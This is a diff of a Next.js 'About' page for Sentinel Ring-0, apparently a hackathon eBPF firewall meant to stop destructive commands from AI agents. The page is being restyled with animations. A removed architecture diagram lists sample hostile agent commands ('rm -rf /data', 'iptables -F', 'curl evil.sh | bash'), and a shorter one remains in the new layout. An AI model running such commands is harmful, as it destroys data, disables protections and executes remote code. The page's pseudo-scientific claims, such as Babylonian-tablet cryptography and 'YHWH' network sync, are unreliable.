@@ -2,9 +2,9 @@
 
 import React, { useState, useEffect } from "react";
 import Link from "next/link";
+import { motion } from "framer-motion";
 import {
   Shield,
-  Cpu,
   Zap,
   GitBranch,
   Hexagon,
@@ -17,93 +17,37 @@ import {
   ChevronRight,
   Terminal,
   Hash,
+  Server,
+  Layers
 } from "lucide-react";
+import { clsx } from "clsx";
 
 const FEATURED_DOCS = [
-  {
-    path: "README.md",
-    title: "Visión General del Proyecto",
-    desc: "Qué es Sentinel Ring-0, el problema que resuelve, arquitectura y cómo probarlo.",
-    color: "emerald",
-    icon: Shield,
-  },
-  {
-    path: "DOCUMENTACION_TECNICA.md",
-    title: "Documentación Técnica Completa",
-    desc: "Todos los módulos, matemática S60, eBPF, TruthSync, API reference y métricas.",
-    color: "sky",
-    icon: Terminal,
-  },
-  {
-    path: "CRYSTAL_LATTICE.md",
-    title: "Crystal Lattice Matrix",
-    desc: "Física del oscilador piezoeléctrico, Plimpton 322, visualización heatmap y cifrado dinámico.",
-    color: "violet",
-    icon: Hexagon,
-  },
+  { path: "README.md", title: "Visión General del Proyecto", desc: "Qué es Sentinel Ring-0, arquitectura y despliegue.", color: "emerald", icon: Shield },
+  { path: "DOCUMENTACION_TECNICA.md", title: "Documentación Técnica", desc: "Módulos, matemática S60, eBPF, y API reference.", color: "sky", icon: Terminal },
+  { path: "CRYSTAL_LATTICE.md", title: "Crystal Lattice Matrix", desc: "Física piezoeléctrica, Plimpton 322 y heatmap.", color: "violet", icon: Hexagon },
 ];
 
 const MODULES = [
-  {
-    icon: GitBranch,
-    color: "text-rose-400",
-    bg: "bg-rose-500/10",
-    border: "border-rose-500/20",
-    name: "eBPF Ring-0",
-    desc: "Hooks LSM en execve/file_open + XDP a velocidad de línea. Intercepta antes de que el proceso tenga privilegios.",
-    badge: "< 0.04 ms",
-  },
-  {
-    icon: Hash,
-    color: "text-amber-400",
-    bg: "bg-amber-500/10",
-    border: "border-amber-500/20",
-    name: "Aritmética S60",
-    desc: "Base-60 en i64 puro, sin floats. SCALE_0 = 60⁴ = 12.960.000. Precisión ±0.0077 ppm, determinismo total.",
-    badge: "±0.0077 ppm",
-  },
-  {
-    icon: Hexagon,
-    color: "text-violet-400",
-    bg: "bg-violet-500/10",
-    border: "border-violet-500/20",
-    name: "Crystal Lattice",
-    desc: "Red de 1024 osciladores piezoeléctricos en S60. Frecuencia derivada de la tablilla babilónica Plimpton 322.",
-    badge: "1024 nodos",
-  },
-  {
-    icon: Brain,
-    color: "text-sky-400",
-    bg: "bg-sky-500/10",
-    border: "border-sky-500/20",
-    name: "Neural LIF S60",
-    desc: "Neuronas Leaky Integrate-and-Fire en S60 puro. La tasa de disparo condiciona el cifrado dinámico de cada tick.",
-    badge: "0 floats",
-  },
-  {
-    icon: Lock,
-    color: "text-emerald-400",
-    bg: "bg-emerald-500/10",
-    border: "border-emerald-500/20",
-    name: "TruthSync",
-    desc: "Verificación matemática de integridad via Plimpton 322. Detecta payloads AIOpsDoom y activa cuarentena automática.",
-    badge: "Plimpton 322",
-  },
-  {
-    icon: Network,
-    color: "text-teal-400",
-    bg: "bg-teal-500/10",
-    border: "border-teal-500/20",
-    name: "MyCNet P2P",
-    desc: "Red mesh sincronizada en ritmo YHWH (10-5-6-5 ticks). Protocolo de sincronía entre nodos distribuidos.",
-    badge: "41.77 Hz",
-  },
+  { icon: GitBranch, color: "text-rose-400", bg: "bg-rose-500/10", border: "border-rose-500/20", name: "eBPF Ring-0", badge: "< 0.04 ms", desc: "Hooks LSM en execve/file_open + XDP a velocidad de línea." },
+  { icon: Hash, color: "text-amber-400", bg: "bg-amber-500/10", border: "border-amber-500/20", name: "Aritmética S60", badge: "±0.0077 ppm", desc: "Base-60 en i64 puro, sin floats. Precisión determinista total." },
+  { icon: Hexagon, color: "text-violet-400", bg: "bg-violet-500/10", border: "border-violet-500/20", name: "Crystal Lattice", badge: "1024 nodos", desc: "Red de osciladores en S60 derivado de Plimpton 322." },
+  { icon: Brain, color: "text-sky-400", bg: "bg-sky-500/10", border: "border-sky-500/20", name: "Neural LIF S60", badge: "0 floats", desc: "Red Spiking Neural Network con cifrado dinámico por pulsos." },
+  { icon: Lock, color: "text-emerald-400", bg: "bg-emerald-500/10", border: "border-emerald-500/20", name: "TruthSync", badge: "Plimpton 322", desc: "Certificación matemática anti AIOpsDoom." },
+  { icon: Network, color: "text-teal-400", bg: "bg-teal-500/10", border: "border-teal-500/20", name: "MyCNet", badge: "41.77 Hz", desc: "Red P2P mallada con sincronización holográfica YHWH." },
 ];
 
-const colorMap: Record<string, { text: string; bg: string; border: string; glow: string }> = {
-  emerald: { text: "text-emerald-400", bg: "bg-emerald-500/10", border: "border-emerald-500/30", glow: "shadow-emerald-500/10" },
-  sky:     { text: "text-sky-400",     bg: "bg-sky-500/10",     border: "border-sky-500/30",     glow: "shadow-sky-500/10"     },
-  violet:  { text: "text-violet-400",  bg: "bg-violet-500/10",  border: "border-violet-500/30",  glow: "shadow-violet-500/10"  },
+const containerVariants = {
+  hidden: { opacity: 0 },
+  visible: {
+    opacity: 1,
+    transition: { staggerChildren: 0.1, delayChildren: 0.1 }
+  }
+};
+
+const itemVariants = {
+  hidden: { y: 20, opacity: 0 },
+  visible: { y: 0, opacity: 1, transition: { type: "spring" as const, stiffness: 100 } }
 };
 
 export function AboutView() {
@@ -112,11 +56,7 @@ export function AboutView() {
 
   useEffect(() => {
     const apiBase = process.env.NEXT_PUBLIC_API_URL || "";
-    const fetch_ = () =>
-      fetch(`${apiBase}/api/v1/sentinel_status`)
-        .then((r) => r.json())
-        .then(setStatus)
-        .catch(() => {});
+    const fetch_ = () => fetch(`${apiBase}/api/v1/sentinel_status`).then(r => r.json()).then(setStatus).catch(() => {});
     fetch_();
     const iv = setInterval(fetch_, 5000);
     return () => clearInterval(iv);
@@ -124,240 +64,228 @@ export function AboutView() {
 
   useEffect(() => {
     const apiBase = process.env.NEXT_PUBLIC_API_URL || "";
-    const fetch_ = () =>
-      fetch(`${apiBase}/api/v1/lattice/state`)
-        .then((r) => r.json())
-        .then((d) => setTick(d.global_tick))
-        .catch(() => {});
+    const fetch_ = () => fetch(`${apiBase}/api/v1/lattice/state`).then(r => r.json()).then(d => setTick(d.global_tick)).catch(() => {});
     fetch_();
     const iv = setInterval(fetch_, 3000);
     return () => clearInterval(iv);
   }, []);
 
-  const bioCoherencePct = status
-    ? Math.min(100, (Math.abs(status.bio_coherence) / 12_960_000) * 100).toFixed(1)
-    : "0.0";
+  const bioCoherencePct = status ? Math.min(100, (Math.abs(status.bio_coherence) / 12_960_000) * 100) : 0;
 
   return (
-    <div className="space-y-8 animate-in fade-in slide-in-from-right-4 duration-500 pb-10">
-
-      {/* ── HERO ── */}
-      <div className="glass-card p-8 border-emerald-500/10 bg-gradient-to-br from-slate-950/80 to-emerald-950/10 relative overflow-hidden">
-        <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top_right,rgba(16,185,129,0.08),transparent_60%)] pointer-events-none" />
-        <div className="relative z-10 flex flex-col md:flex-row md:items-center gap-6">
-          <div className="p-4 bg-emerald-500/10 rounded-3xl border border-emerald-500/20 shadow-[0_0_40px_rgba(16,185,129,0.12)] shrink-0">
-            <Shield className="w-12 h-12 text-emerald-400" />
-          </div>
-          <div className="flex-1 space-y-2">
-            <div className="flex flex-wrap items-center gap-2">
-              <h1 className="text-3xl font-black uppercase tracking-tighter text-white">
-                Sentinel Ring-0
+    <motion.div 
+      variants={containerVariants}
+      initial="hidden"
+      animate="visible"
+      className="space-y-6 pb-12"
+    >
+      {/* ── BENTO HERO ── */}
+      <motion.div variants={itemVariants} className="grid grid-cols-1 lg:grid-cols-12 gap-6 relative">
+        <div className="absolute inset-0 bg-emerald-500/5 blur-[100px] -z-10 rounded-full pointer-events-none" />
+        
+        {/* Main Presentation Box */}
+        <div className="glass-card col-span-1 lg:col-span-8 p-8 md:p-12 relative overflow-hidden group hover:border-emerald-500/30 transition-colors">
+          <div className="absolute top-0 right-0 p-32 bg-emerald-500/10 rounded-full blur-[80px] group-hover:bg-emerald-500/20 transition-all duration-700" />
+          
+          <div className="relative z-10">
+            <div className="flex flex-wrap items-center gap-3 mb-6">
+              <div className="p-3 bg-emerald-500/10 rounded-2xl border border-emerald-500/20 shadow-[0_0_30px_rgba(16,185,129,0.2)]">
+                <Shield className="w-8 h-8 text-emerald-400" />
+              </div>
+              <h1 className="text-4xl md:text-5xl font-extrabold tracking-tighter text-white">
+                Sentinel <span className="text-emerald-400">Ring-0</span>
               </h1>
-              <span className="px-2.5 py-0.5 bg-emerald-500/10 border border-emerald-500/30 rounded-full text-[9px] font-black text-emerald-400 uppercase tracking-widest">
-                v1.0.0
-              </span>
-              <span className="px-2.5 py-0.5 bg-sky-500/10 border border-sky-500/30 rounded-full text-[9px] font-black text-sky-400 uppercase tracking-widest">
-                Hackatón CubePath 2026
-              </span>
             </div>
-            <p className="text-slate-400 text-sm leading-relaxed max-w-2xl">
-              Firewall cognitivo que opera en <span className="text-white font-bold">Ring-0 del kernel Linux</span> vía eBPF. Intercepta syscalls destructivas de agentes de IA{" "}
-              <span className="text-emerald-400 font-bold">antes de que se ejecuten</span>, usando aritmética Base-60 sin floats y memoria de cristales resonantes.
+            
+            <p className="text-slate-400 text-base md:text-lg leading-relaxed max-w-2xl font-medium mb-8">
+              El <strong className="text-white">Firewall Cognitivo</strong> que intercepta Syscalls maliciosos de IA directamente en el Kernel de Linux a través de eBPF. Precisión armónica forjada en aritmética hiper-determinista Base-60.
             </p>
-            <div className="flex flex-wrap gap-3 pt-1">
-              <a
-                href="https://vps23309.cubepath.net/"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="flex items-center gap-2 px-3 py-1.5 bg-emerald-500/10 border border-emerald-500/30 rounded-lg text-[10px] font-black text-emerald-400 uppercase tracking-widest hover:bg-emerald-500/20 transition-colors"
-              >
-                <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
+            
+            <div className="flex flex-wrap gap-4">
+              <a href="https://vps23309.cubepath.net/" target="_blank" rel="noopener noreferrer"
+                 className="flex items-center gap-2 px-5 py-2.5 bg-emerald-500/10 border border-emerald-500/40 rounded-xl text-xs font-black text-emerald-400 uppercase tracking-widest hover:bg-emerald-500 hover:text-slate-950 transition-all shadow-[0_0_20px_rgba(16,185,129,0.15)] hover:shadow-[0_0_30px_rgba(16,185,129,0.4)]">
+                <div className="w-2 h-2 rounded-full bg-current animate-pulse" />
                 Demo en Vivo
-                <ExternalLink className="w-3 h-3" />
+                <ExternalLink className="w-4 h-4" />
               </a>
-              <a
-                href="https://github.com/jenovoas/sentinel_cubepath"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="flex items-center gap-2 px-3 py-1.5 bg-slate-800 border border-white/5 rounded-lg text-[10px] font-black text-slate-400 uppercase tracking-widest hover:text-white hover:border-white/10 transition-colors"
-              >
-                GitHub
-                <ExternalLink className="w-3 h-3" />
+              <a href="https://github.com/jenovoas/sentinel_cubepath" target="_blank" rel="noopener noreferrer"
+                 className="flex items-center gap-2 px-5 py-2.5 bg-slate-800 border border-white/10 rounded-xl text-xs font-black text-slate-300 uppercase tracking-widest hover:bg-slate-700 hover:text-white transition-all">
+                Repositorio GitHub
               </a>
-              <Link
-                href="/docs"
-                className="flex items-center gap-2 px-3 py-1.5 bg-slate-800 border border-white/5 rounded-lg text-[10px] font-black text-slate-400 uppercase tracking-widest hover:text-white hover:border-white/10 transition-colors"
-              >
-                <BookOpen className="w-3 h-3" />
-                Documentación
-              </Link>
             </div>
           </div>
-          {/* Live pulse */}
-          <div className="shrink-0 flex flex-col items-center gap-1 px-6 border-l border-white/5 hidden md:flex">
-            <Activity className="w-5 h-5 text-emerald-400 animate-pulse" />
-            <span className="text-[8px] font-black uppercase tracking-widest text-slate-600">Tick S60</span>
-            <span className="text-2xl font-black mono text-white tabular-nums">{tick.toLocaleString("es-CL")}</span>
-            <span className="text-[8px] text-slate-600 mono">41.77 Hz</span>
-          </div>
         </div>
-      </div>
 
-      {/* ── MÉTRICAS LIVE ── */}
-      <div>
-        <h2 className="text-[10px] font-black uppercase tracking-[0.25em] text-slate-500 mb-3">
-          Estado del sistema — en vivo
-        </h2>
-        <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
-          {[
-            { label: "Ring Status",     value: status?.ring_status    ?? "—", color: "text-emerald-400" },
-            { label: "XDP Firewall",    value: status?.xdp_firewall   ?? "—", color: "text-rose-400"    },
-            { label: "LSM Cognitive",   value: status?.lsm_cognitive  ?? "—", color: "text-sky-400"     },
-            { label: "Bio Coherencia",  value: `${bioCoherencePct}%`,         color: "text-violet-400"  },
-          ].map((s) => (
-            <div key={s.label} className="glass-card p-4 space-y-1 border-white/5">
-              <span className="text-[8px] font-black uppercase tracking-widest text-slate-600">{s.label}</span>
-              <p className={`text-sm font-black mono ${s.color}`}>{s.value}</p>
-            </div>
-          ))}
+        {/* Live Metrics Sidebar Box */}
+        <div className="glass-card col-span-1 lg:col-span-4 p-6 flex flex-col justify-between relative overflow-hidden group hover:border-sky-500/30 transition-colors">
+           <div className="absolute bottom-0 right-0 p-24 bg-sky-500/10 rounded-full blur-[60px] group-hover:bg-sky-500/20 transition-all duration-700" />
+           <div className="relative z-10 space-y-6">
+              <div className="flex items-center justify-between border-b border-white/5 pb-4">
+                 <div className="flex items-center gap-2 text-slate-500">
+                    <Activity className="w-4 h-4 text-sky-400 animate-pulse" />
+                    <span className="text-[10px] font-black uppercase tracking-[0.2em]">Tick Core S60</span>
+                 </div>
+                 <span className="text-xl font-bold mono text-white tabular-nums">{tick.toLocaleString("es-CL")}</span>
+              </div>
+              
+              <div className="space-y-4">
+                 <div className="space-y-1">
+                    <div className="flex justify-between text-[10px] uppercase font-black tracking-widest text-slate-400">
+                       <span>Bio Coherencia</span>
+                       <span className="text-violet-400">{bioCoherencePct.toFixed(1)}%</span>
+                    </div>
+                    <div className="h-1.5 w-full bg-slate-900 rounded-full overflow-hidden">
+                       <motion.div 
+                          className="h-full bg-violet-500"
+                          initial={{ width: 0 }}
+                          animate={{ width: `${bioCoherencePct}%` }}
+                          transition={{ duration: 1.5, ease: "easeOut" }}
+                       />
+                    </div>
+                 </div>
+                 
+                 <div className="grid grid-cols-2 gap-4 pt-2">
+                    <div>
+                       <span className="text-[9px] font-bold uppercase tracking-widest text-slate-500">Ahorro CPU</span>
+                       <p className="text-xl font-black text-emerald-400 mono">62.9%</p>
+                    </div>
+                    <div>
+                       <span className="text-[9px] font-bold uppercase tracking-widest text-slate-500">Predictividad</span>
+                       <p className="text-xl font-black text-amber-400 mono">94.4%</p>
+                    </div>
+                 </div>
+              </div>
+           </div>
         </div>
-      </div>
+      </motion.div>
 
-      {/* ── MÓDULOS ── */}
-      <div>
-        <h2 className="text-[10px] font-black uppercase tracking-[0.25em] text-slate-500 mb-3">
-          Módulos del sistema
-        </h2>
+      {/* ── BENTO MODULES ── */}
+      <motion.div variants={itemVariants} className="space-y-4">
+        <div className="flex items-center gap-3 text-slate-400">
+           <Layers className="w-5 h-5 text-emerald-500" />
+           <h2 className="text-xs font-black uppercase tracking-[0.25em]">Motor de Vanguardia</h2>
+        </div>
+        
         <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-          {MODULES.map((mod) => (
-            <div
+          {MODULES.map((mod, i) => (
+            <motion.div
               key={mod.name}
-              className={`glass-card p-5 border ${mod.border} ${mod.bg} space-y-3 hover:scale-[1.01] transition-transform`}
+              whileHover={{ y: -5, scale: 1.01 }}
+              transition={{ type: "spring" as const, stiffness: 400 }}
+              className={clsx(
+                "glass-card p-6 border transition-all duration-300 relative group overflow-hidden cursor-default",
+                mod.border,
+                mod.bg.replace("10", "5") // Less intense background normally
+              )}
             >
-              <div className="flex items-center justify-between">
+              <div className={clsx("absolute inset-0 opacity-0 group-hover:opacity-100 transition-opacity duration-500 blur-2xl -z-10", mod.bg)} />
+              
+              <div className="flex items-center justify-between mb-4">
                 <div className="flex items-center gap-3">
-                  <div className={`p-2 ${mod.bg} rounded-xl border ${mod.border}`}>
-                    <mod.icon className={`w-4 h-4 ${mod.color}`} />
+                  <div className={clsx("p-2.5 rounded-xl border", mod.bg, mod.border)}>
+                    <mod.icon className={clsx("w-5 h-5 drop-shadow-md", mod.color)} />
                   </div>
-                  <span className="text-sm font-black text-white">{mod.name}</span>
+                  <span className="text-sm font-extrabold text-white tracking-tight">{mod.name}</span>
                 </div>
-                <span className={`text-[8px] font-black mono px-2 py-0.5 rounded border ${mod.border} ${mod.color} bg-black/20`}>
+                <span className={clsx("text-[9px] font-black mono px-2 py-1 rounded-md border bg-black/40", mod.border, mod.color)}>
                   {mod.badge}
                 </span>
               </div>
-              <p className="text-[10px] text-slate-500 leading-relaxed">{mod.desc}</p>
-            </div>
+              <p className="text-[11px] text-slate-400 leading-relaxed font-medium">{mod.desc}</p>
+            </motion.div>
           ))}
         </div>
-      </div>
+      </motion.div>
 
-      {/* ── ARQUITECTURA ASCII ── */}
-      <div className="glass-card p-6 border-white/5 bg-slate-950/60">
-        <h2 className="text-[10px] font-black uppercase tracking-[0.25em] text-slate-500 mb-4">
-          Arquitectura del sistema
-        </h2>
-        <pre className="text-[9px] leading-relaxed text-slate-400 font-mono overflow-x-auto">{`
-  AGENTE IA (GPT-4 / Claude / Gemini / Llama)
-  Ejecuta: rm -rf /data  |  iptables -F  |  curl evil.sh | bash
-           │
-           │  syscall
-           ▼
-╔══════════════════════════════════════════════════╗
-║  RING 0 — KERNEL eBPF                           ║
-║  ┌──────────────┐  ┌─────────────┐  ┌─────────┐ ║
-║  │lsm_guardian  │  │xdp_firewall │  │tc_kill  │ ║
-║  │execve hook   │  │< 0.04 ms    │  │switch   │ ║
-║  │file_open hook│  │line-rate    │  │quaranta │ ║
-║  └──────┬───────┘  └─────────────┘  └─────────┘ ║
-║         │ RingBuffer 256KB (zero-copy)            ║
-╠═════════╪════════════════════════════════════════╣
-║  RING 3 — RUST + AXUM + TOKIO                   ║
-║         │                                        ║
-║  ┌──────▼──────────────────────────────────────┐ ║
-║  │  math/s60.rs  —  Base-60 i64, sin floats   │ ║
-║  │  SCALE_0 = 60⁴ = 12.960.000               │ ║
-║  └──────┬──────────────────────────────────────┘ ║
-║         │                                        ║
-║  crystal.rs   SovereignCrystal × 1024  (NUEVO)  ║
-║  resonant.rs  ResonantMemory 1024 nodos (NUEVO)  ║
-║  neural.rs    Neuronas LIF en S60 puro  (NUEVO)  ║
-║  truthsync.rs Plimpton 322 verification         ║
-║  quantum/     BioResonador + PortalDetector     ║
-║  mycnet.rs    P2P mesh YHWH (10-5-6-5)          ║
-╠══════════════════════════════════════════════════╣
-║  FRONTEND — Next.js + React + TypeScript        ║
-║  Dashboard  │ AIOps Shield  │ Crystal Matrix    ║
-║  MyCNet     │ Audit Vault   │ Docs Vault        ║
-╚══════════════════════════════════════════════════╝
-        `}</pre>
-      </div>
+      {/* ── ARCHITECTURE VISUALIZATION ── */}
+      <motion.div variants={itemVariants} className="glass-card p-6 border-white/5 relative overflow-hidden group">
+         <div className="flex items-center gap-3 text-slate-400 mb-8">
+            <Server className="w-5 h-5 text-sky-500" />
+            <h2 className="text-xs font-black uppercase tracking-[0.25em]">Arquitectura eBPF en Profundidad</h2>
+         </div>
+         
+         <div className="relative z-10 py-6">
+            <div className="flex flex-col md:flex-row items-center justify-center gap-4 md:gap-8 px-4">
+               
+               {/* User Space Node */}
+               <motion.div 
+                  whileHover={{ scale: 1.05 }}
+                  className="w-full md:w-64 p-5 rounded-2xl bg-slate-900 border border-slate-700 shadow-[0_0_30px_rgba(0,0,0,0.5)] z-20 flex col items-center flex-col text-center"
+               >
+                  <Brain className="w-8 h-8 text-rose-500 mb-3" />
+                  <span className="text-xs font-black text-rose-400 uppercase tracking-widest">Agente de IA</span>
+                  <span className="text-[9px] text-slate-500 mt-1 block font-mono">rm -rf /data | bash</span>
+               </motion.div>
 
-      {/* ── DOCS CLAVE ── */}
-      <div>
-        <div className="flex items-center justify-between mb-3">
-          <h2 className="text-[10px] font-black uppercase tracking-[0.25em] text-slate-500">
-            Documentación clave
-          </h2>
-          <Link
-            href="/docs"
-            className="flex items-center gap-1 text-[9px] font-black uppercase tracking-widest text-slate-600 hover:text-emerald-400 transition-colors"
-          >
-            Ver archivo completo (163 docs)
-            <ChevronRight className="w-3 h-3" />
-          </Link>
-        </div>
-        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
-          {FEATURED_DOCS.map((doc) => {
-            const c = colorMap[doc.color];
+               {/* Connection Line (Syscall) */}
+               <div className="relative flex flex-col items-center justify-center my-4 md:my-0 md:w-20">
+                  <div className="hidden md:block w-full h-[2px] bg-gradient-to-r from-slate-700 via-rose-500 to-emerald-500" />
+                  <div className="md:hidden h-10 w-[2px] bg-gradient-to-b from-slate-700 via-rose-500 to-emerald-500" />
+                  <span className="absolute -top-6 text-[9px] font-bold text-slate-400 uppercase tracking-widest bg-slate-950 px-2 rounded-full border border-white/5">Syscall</span>
+               </div>
+
+               {/* Ring-0 Node */}
+               <motion.div 
+                  whileHover={{ scale: 1.05 }}
+                  className="w-full md:w-72 p-5 rounded-2xl bg-emerald-950/20 border-2 border-emerald-500/40 shadow-[0_0_40px_rgba(16,185,129,0.15)] z-20 flex col items-center flex-col text-center relative overflow-hidden"
+               >
+                  <div className="absolute inset-0 bg-[url('/matrix-bg.png')] opacity-10 mix-blend-overlay" />
+                  <Shield className="w-8 h-8 text-emerald-400 mb-3 drop-shadow-[0_0_10px_rgba(16,185,129,0.8)]" />
+                  <span className="text-xs font-black text-emerald-400 uppercase tracking-widest">Hooks LSM + XDP</span>
+                  <span className="text-[9px] text-emerald-500/60 mt-1 block font-mono">Ejecución en Kernel Ring-0</span>
+               </motion.div>
+
+               {/* Buffer Line */}
+               <div className="relative flex flex-col items-center justify-center my-4 md:my-0 md:w-20">
+                  <div className="hidden md:block w-full h-[2px] bg-gradient-to-r from-emerald-500 via-sky-500 to-sky-500 border-dashed" />
+                  <div className="md:hidden h-10 w-[2px] bg-gradient-to-b from-emerald-500 via-sky-500 to-sky-500 border-dashed" />
+                  <span className="absolute -bottom-6 text-[9px] font-bold text-slate-400 uppercase tracking-widest bg-slate-950 px-2 rounded-full border border-white/5">0-Copy Buffer</span>
+               </div>
+
+               {/* Rust Sentinel Node */}
+               <motion.div 
+                  whileHover={{ scale: 1.05 }}
+                  className="w-full md:w-64 p-5 rounded-2xl bg-sky-950/20 border-2 border-sky-500/40 shadow-[0_0_30px_rgba(14,165,233,0.15)] z-20 flex col items-center flex-col text-center"
+               >
+                  <Zap className="w-8 h-8 text-sky-400 mb-3" />
+                  <span className="text-xs font-black text-sky-400 uppercase tracking-widest">Motor S60 (Rust)</span>
+                  <span className="text-[9px] text-sky-500/60 mt-1 block font-mono">Análisis semántico en Ring-3</span>
+               </motion.div>
+
+            </div>
+         </div>
+      </motion.div>
+
+      {/* ── DOCS & FOOTER ── */}
+      <motion.div variants={itemVariants} className="grid grid-cols-1 lg:grid-cols-3 gap-6">
+         {FEATURED_DOCS.map((doc) => {
+            const colorMeta: Record<string, { t: string, b: string }> = {
+               emerald: { t: "text-emerald-400", b: "border-emerald-500/30" },
+               sky: { t: "text-sky-400", b: "border-sky-500/30" },
+               violet: { t: "text-violet-400", b: "border-violet-500/30" }
+            };
+            const c = colorMeta[doc.color];
             return (
-              <Link key={doc.path} href={`/docs/${doc.path}`}>
-                <div
-                  className={`glass-card p-5 border ${c.border} ${c.bg} shadow-lg ${c.glow} space-y-3 hover:scale-[1.02] transition-all duration-200 cursor-pointer h-full`}
-                >
-                  <div className="flex items-center gap-3">
-                    <div className={`p-2 ${c.bg} rounded-xl border ${c.border}`}>
-                      <doc.icon className={`w-4 h-4 ${c.text}`} />
-                    </div>
-                    <span className={`text-[9px] font-black mono uppercase tracking-widest ${c.text}`}>
-                      {doc.path}
-                    </span>
-                  </div>
-                  <h3 className="text-sm font-black text-white leading-tight">{doc.title}</h3>
-                  <p className="text-[10px] text-slate-500 leading-relaxed">{doc.desc}</p>
-                  <div className={`flex items-center gap-1 text-[9px] font-black ${c.text} mt-auto`}>
-                    Leer documento <ChevronRight className="w-3 h-3" />
-                  </div>
-                </div>
-              </Link>
-            );
-          })}
-        </div>
-      </div>
-
-      {/* ── HACKATHON INFO ── */}
-      <div className="glass-card p-6 border-sky-500/10 bg-slate-950/40 flex flex-col md:flex-row gap-6 items-start md:items-center">
-        <div className="flex-1 space-y-1">
-          <span className="text-[8px] font-black uppercase tracking-[0.3em] text-sky-500">Hackatón CubePath 2026 · MiduDev</span>
-          <h3 className="text-lg font-black text-white">Desarrollado por Jaime Novoa</h3>
-          <p className="text-[10px] text-slate-500">
-            Deadline: <span className="text-white font-bold">31 de marzo de 2026, 23:59 CET</span> ·
-            Criterios: UX → Creatividad → Utilidad → Implementación técnica
-          </p>
-        </div>
-        <div className="grid grid-cols-3 gap-3 shrink-0">
-          {[
-            { v: "< 0.04 ms", l: "Latencia XDP"   },
-            { v: "62.9%",     l: "Ahorro CPU"      },
-            { v: "94.4%",     l: "Eficiencia Sched"},
-          ].map((m) => (
-            <div key={m.l} className="text-center">
-              <p className="text-lg font-black text-sky-400 mono">{m.v}</p>
-              <p className="text-[8px] text-slate-600 uppercase tracking-wider">{m.l}</p>
-            </div>
-          ))}
-        </div>
-      </div>
-
-    </div>
+               <Link href={`/docs/${doc.path}`} key={doc.path}>
+                  <motion.div whileHover={{ y: -4 }} className="glass-card h-full p-6 border-white/5 hover:border-white/20 transition-all group flex flex-col justify-between cursor-pointer">
+                     <div>
+                        <div className="flex items-center gap-3 mb-4">
+                           <div className={`p-2 rounded-xl border ${c.b} bg-slate-900`}>
+                              <doc.icon className={`w-4 h-4 ${c.t}`} />
+                           </div>
+                           <span className={`text-[10px] font-black uppercase tracking-widest ${c.t}`}>{doc.path}</span>
+                        </div>
+                        <h3 className="text-sm font-bold text-white mb-2">{doc.title}</h3>
+                        <p className="text-[11px] text-slate-400 leading-relaxed font-medium">{doc.desc}</p>
+                     </div>
+                     <div className="flex items-center gap-1 text-[9px] font-black text-slate-500 group-hover:text-white mt-6 transition-colors">
+                        LEER DOCUMENTO <ChevronRight className="w-3 h-3" />
+                     </div>
+                  </motion.div>
+               </Link>
+            )
+         })}
+      </motion.div>
+    </motion.div>
   );
 }
